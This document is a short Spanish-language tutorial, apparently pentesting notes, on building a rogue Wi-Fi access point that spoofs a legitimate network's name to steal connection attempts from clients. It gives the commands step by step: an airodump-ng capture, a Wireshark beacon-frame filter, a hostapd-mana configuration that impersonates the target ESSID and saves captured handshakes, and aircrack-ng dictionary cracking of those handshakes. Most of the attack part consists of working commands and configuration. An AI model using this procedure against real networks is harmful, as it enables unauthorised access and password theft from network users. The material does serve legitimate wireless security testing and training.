# Intro

Un Rouge access point es todo AP no autorizado por un administrador de redes local.

Cuando un cliente se conecta a una red la guarda como favorita dentro de los PNL. De esta manera puede volver a conectarse automáticamente cuando se encuentre en el rango de señal de la misma.
Muchas empresas usan varias redes con el mismo nombre y configuración para cubrir espacios grandes en sus oficinas. De esta manera, cuando el usuario camina por la oficina y comienza a salir del rango de la red "A" y comienza  captar la red "B", el dispositivo se reconecta automáticamente a la red "B".

Podemos crear nuestros propios Rouge AP con el fin de robar intentos de conexión desde dispositivos con la red legítima.


# El Ataque

### Discovery

Aunque en algunos casos se requiere solamente el ESSID de la red, el ataque funciona mejor si conseguimos también el modo de encriptación de la misma (esto se debe a que el PNL muchas veces guarda la clave encriptada y la envía, si no tenemos el mismo tipo de encriptación, se vuelve casi imposible)

#### 1) Captamos información de la red que vamos a spoofear.

    sudo airodump-ng -w discovery --output-format pcap <interfaz>

#### 2) abrimos el pcap en wireshark y buscamos los Beacon frame packets con el filtro

    wlan.fc.type_subtype == 0x08 && wlan.ssid == "<ESSID>"

#### 3) Del paquete, dentro de la trama wireless management/Tagged parameters extraemoslo que necesitamos para crear el archivo de configuración

#### 4) Creamos el archivo de configuración .conf

    1 interface=<interfaz>
    2 ssid=<ESSID>
    3 channel=<channel>
    4 ieee80211n=1
    5 hw_mode=g
    6 wpa=3
    7 wpa_key_mgmt=WPA-PSK
    8 wpa_passphrase=NOTHING
    9 wpa_pairwise=<pairwise>(ejemplo TKIP CCMP)
    10 rsn_pairwise=<rsn>(ejemplo TKIP CCMP)
    11 mana_wpaout=/home/kali/<.hccapx>

#### 5) levantamos la red

    sudo hostapd-mana <.conf>

Luego de esto esperamos a que se capture un handshake


6)Crackeamos el  handshake con aircrack

    aircrack-ng <.hccapx> -e <ESSID> -w <dictio>
